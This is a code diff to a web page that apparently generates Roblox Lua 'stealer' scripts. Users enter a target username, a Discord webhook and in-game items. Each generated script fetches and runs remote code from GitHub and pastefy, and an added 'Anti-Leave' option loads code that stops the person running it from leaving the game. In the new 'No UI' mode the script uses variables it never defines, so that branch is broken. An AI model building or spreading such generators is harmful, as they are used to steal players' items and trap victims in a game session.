@@ -457,6 +457,35 @@
       transform: translateX(18px);
     }
 
+    /* NEW: Mode Selector */
+    .mode-selector {
+      display: flex;
+      gap: 0.5rem;
+      padding: 5px;
+      border-radius: 12px;
+      background: rgba(0, 0, 0, 0.3);
+      border: 1px solid var(--border);
+    }
+    
+    .mode-btn {
+      flex: 1;
+      padding: 0.6rem;
+      border: none;
+      border-radius: 8px;
+      background: transparent;
+      color: var(--muted);
+      font-size: 0.75rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+    
+    .mode-btn.active {
+      background: linear-gradient(135deg, var(--primary), var(--accent));
+      color: #fff;
+      box-shadow: 0 2px 10px var(--primary-glow);
+    }
+
     .output-header {
       display: flex;
       align-items: center;
@@ -696,6 +725,16 @@
 
     <div class="grid">
       <div class="card card-form">
+        
+        <!-- SCRIPT MODE -->
+        <div class="field">
+          <label class="label">Script Mode</label>
+          <div class="mode-selector">
+            <button class="mode-btn active" id="modeDefault">Default (UI)</button>
+            <button class="mode-btn" id="modeNoUI">No UI (Custom Loader)</button>
+          </div>
+        </div>
+
         <div class="field">
           <label class="label">Roblox Username</label>
           <input type="text" id="usernameInput" placeholder="Your username" value="">
@@ -751,6 +790,15 @@
               <div class="desc">Only show the tiny loadstring link</div>
             </div>
             <input type="checkbox" id="shortLoadstring" checked>
+            <span class="toggle"></span>
+          </label>
+          
+          <label class="checkbox-row" style="margin-top: 0.5rem;">
+            <div class="info">
+              <div class="name">Anti-Leave</div>
+              <div class="desc">Prevents you from leaving the game</div>
+            </div>
+            <input type="checkbox" id="antiLeaveToggle">
             <span class="toggle"></span>
           </label>
         </div>
@@ -876,6 +924,8 @@
       const selectedBrainrots = new Set();
       const selectedSkins = new Set();
       const selectedGears = new Set();
+      
+      let currentMode = 'default'; // 'default' or 'noui'
 
       const $ = (id) => document.getElementById(id);
 
@@ -892,6 +942,23 @@
       const usernameInput = $('usernameInput');
       const webhookInput = $('webhookInput');
       const shortLoadstringCheck = $('shortLoadstring');
+      const antiLeaveToggle = $('antiLeaveToggle');
+      
+      // Mode buttons
+      const modeDefaultBtn = $('modeDefault');
+      const modeNoUIbtn = $('modeNoUI');
+
+      modeDefaultBtn.addEventListener('click', () => {
+        currentMode = 'default';
+        modeDefaultBtn.classList.add('active');
+        modeNoUIbtn.classList.remove('active');
+      });
+      
+      modeNoUIbtn.addEventListener('click', () => {
+        currentMode = 'noui';
+        modeNoUIbtn.classList.add('active');
+        modeDefaultBtn.classList.remove('active');
+      });
 
       function renderPills(container, items, selectedSet, type) {
         container.innerHTML = '';
@@ -1025,25 +1092,28 @@
 
         let valid = true;
 
-        if (!username) {
-          markInvalid(usernameInput);
-          valid = false;
-        }
+        // Validation only applies to Default mode (No UI mode doesn't use these)
+        if (currentMode === 'default') {
+          if (!username) {
+            markInvalid(usernameInput);
+            valid = false;
+          }
 
-        if (!webhook || !webhook.includes('discord.com/api/webhooks')) {
-          markInvalid(webhookInput);
-          valid = false;
-        }
+          if (!webhook || !webhook.includes('discord.com/api/webhooks')) {
+            markInvalid(webhookInput);
+            valid = false;
+          }
 
-        if (!valid) {
-          showToast('Fill in username and a valid Discord webhook');
-          scriptOutput.className = 'output-box error';
-          scriptOutput.textContent =
-            '❌ Missing required fields.\n\n' +
-            '• Roblox Username is required\n' +
-            '• Discord Webhook is required\n\n' +
-            'Fix these and try again.';
-          return;
+          if (!valid) {
+            showToast('Fill in username and a valid Discord webhook');
+            scriptOutput.className = 'output-box error';
+            scriptOutput.textContent =
+              '❌ Missing required fields.\n\n' +
+              '• Roblox Username is required\n' +
+              '• Discord Webhook is required\n\n' +
+              'Fix these and try again.';
+            return;
+          }
         }
 
         if (selectedBrainrots.size === 0) {
@@ -1072,29 +1142,64 @@
               .join('\n')
           : '';
 
-        let luaScript =
-          'local TARGET_ID = 245727\n' +
-          'local TARGET_USER = "' + usernameEscaped + '"\n' +
-          'local WEBHOOK_URL = "' + webhookEscaped + '"\n' +
-          '\n' +
-          'local TargetBrainrots = {\n' +
-          brainrotsBlock + '\n' +
-          '}\n' +
-          '\n' +
-          'local TargetBaseSkins = {\n' +
-          skinsBlock + '\n' +
-          '}\n' +
-          '\n' +
-          'local TargetGears = {\n' +
-          gearsBlock + '\n' +
-          '}\n' +
-          '\n' +
-          'task.spawn(function()\n' +
-          '    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()\n' +
-          '    if type(script) == "function" then\n' +
-          '        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)\n' +
-          '    end\n' +
-          'end)\n';
+        // Build script based on selected mode
+        let luaScript = '';
+        
+        // Add Anti-Leave block if enabled (goes at the very top)
+        if (antiLeaveToggle.checked) {
+          luaScript += 'task.spawn(function()\n' +
+                       '    loadstring(game:HttpGet("https://raw.githubusercontent.com/WithKevinDev/kevin-anti-leave/refs/heads/main/main.lua"))()\n' +
+                       'end)\n\n';
+        }
+
+        if (currentMode === 'default') {
+          // Default Mode (With UI variables)
+          luaScript += 'local TARGET_ID = 245727\n' +
+            'local TARGET_USER = "' + usernameEscaped + '"\n' +
+            'local WEBHOOK_URL = "' + webhookEscaped + '"\n' +
+            '\n' +
+            'local TargetBrainrots = {\n' +
+            brainrotsBlock + '\n' +
+            '}\n' +
+            '\n' +
+            'local TargetBaseSkins = {\n' +
+            skinsBlock + '\n' +
+            '}\n' +
+            '\n' +
+            'local TargetGears = {\n' +
+            gearsBlock + '\n' +
+            '}\n' +
+            '\n' +
+            'task.spawn(function()\n' +
+            '    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()\n' +
+            '    if type(script) == "function" then\n' +
+            '        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)\n' +
+            '    end\n' +
+            'end)\n';
+        } else {
+          // No UI Mode (No variables, custom loader)
+          luaScript += 'local TargetBrainrots = {\n' +
+            brainrotsBlock + '\n' +
+            '}\n' +
+            '\n' +
+            'local TargetBaseSkins = {\n' +
+            skinsBlock + '\n' +
+            '}\n' +
+            '\n' +
+            'local TargetGears = {\n' +
+            gearsBlock + '\n' +
+            '}\n' +
+            '\n' +
+            'task.spawn(function()\n' +
+            '    loadstring(game:HttpGet("https://pastefy.app/RsqRaQC0/raw"))()\n' +
+            'end)\n\n' +
+            'task.spawn(function()\n' +
+            '    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()\n' +
+            '    if type(script) == "function" then\n' +
+            '        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)\n' +
+            '    end\n' +
+            'end)\n';
+        }
 
         generateBtn.disabled = true;
         generateBtn.innerHTML = '<span class="spinner"></span>Uploading...';
